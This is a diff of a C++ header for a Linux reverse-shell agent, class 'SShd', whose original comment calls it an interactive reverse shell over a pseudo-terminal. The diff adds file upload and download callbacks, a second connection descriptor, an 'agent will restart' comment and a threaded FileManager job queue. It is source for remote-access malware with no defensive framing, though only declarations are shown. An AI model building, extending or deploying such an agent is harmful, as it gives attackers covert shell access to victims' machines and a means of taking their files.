@@ -6,57 +6,78 @@
 #include <unistd.h>
 #include "net/HttpRequest.h"
 #include "net/Buffer.h"
-#include "FileManager.h"
+#include <queue>
+#include <thread>
+#include <map>
+#include <mutex>
+#include <condition_variable>
+#include <functional>
+#include <sys/prctl.h>
+
+using fileDownloadCallBack = std::function<int(HttpRequest*, string)>;
+using fileUploadCallBack   = std::function<int(HttpRequest*, string)>;
+using File_JobFunction = std::function<void()>;
+
 
 /**
- * @brief 基于linux伪终端的交互式反弹shell
- * @design 单例模式，不反回对象指针, 只暴露getInstance接口
+ * @brief a rshell based tty for linux
+ * @design: single and nothing return, all things all resourse do inside the
+ *          class, just expose this interfase
  */
-
 class SShd {
 public:
-    static int getInstance(int fd) {
+    static void getInstance(std::vector<int> fds) {
         if (sshd_ == nullptr) {
-            sshd_ = new SShd(fd);
+            sshd_ = new SShd(fds);
         }
 
         switch (sshd_->runshell()) {
-            case CLOSE:
+            // agent will restart
+            case CLOSE: 
                 delete sshd_;
-            case ERROR:
+            case ERROR: 
                 delete sshd_;
         }
     }
 
     ~SShd() {
         delete httpHandler_;
-        close (fd_);
+        close(fd_);
+        close(ffd_);
     }
 
 private:
-    SShd(int fd) : fd_(fd), httpHandler_(new HttpRequest(fd)) {
+    SShd(std::vector<int>& fds)
+        : fd_(fds[0]), ffd_(fds[1]), httpHandler_(new HttpRequest(fds[0])) {
         init();
     }
 
-    // 初始化一个伪终端
+    // init the tty
     void init();
 
-    // 二次进入loop
+    // for access the loop agagin
     void reset();
 
     // core shell-loop
     int runshell();
 
-    // 伪终端事件,自定义，不是回调
-    int  _events_pty_readable();
-    int  _events_pty_writable();
-    void _events_pty_close();
-    int  _events_CC_readable();
+    // event defined by self
+    int _events_pty_readable();
+    int _events_pty_writable();
+    int _events_file();
 
-    // 拓展命令
+    // call back for file
+    fileDownloadCallBack getfile_;
+    fileUploadCallBack   putfile_;
+    int                  getFile(HttpRequest* httpHandler, string path);
+    int                  putFile(HttpRequest* httpHandler, string path);
+
+    // some call p-private
     int _setNonBlock(int fd);
+    int _events_CC_readable(HttpRequest* httphandler);
 
     int    fd_;
+    int    ffd_;
     int    tty_;  // slave side
     int    pty_;  // master side
     string cmd_;
@@ -73,4 +94,31 @@ private:
         CLOSE,
     };
 };
+
+
+
+class FileManager {
+public:
+    static FileManager* getInstance(int num = 2, std::vector<std::thread> * const threads = nullptr ) {
+        if (fileManager_ == nullptr) {
+            fileManager_ = new FileManager(num, threads);
+        }
+        return fileManager_;
+    }
+
+    void File_pushJob(const File_JobFunction& job);
+    FileManager(int num, std::vector<std::thread> *const threads);
+    ~FileManager();
+
+    // std::vector<std::thread> threads_;
+
+private:
+    std::queue<File_JobFunction> Job_queues_;
+    std::mutex                   File_lock_;
+    std::condition_variable      File_conn_;
+    bool                         stop_;
+
+    static FileManager *fileManager_;
+};
+
 #endif
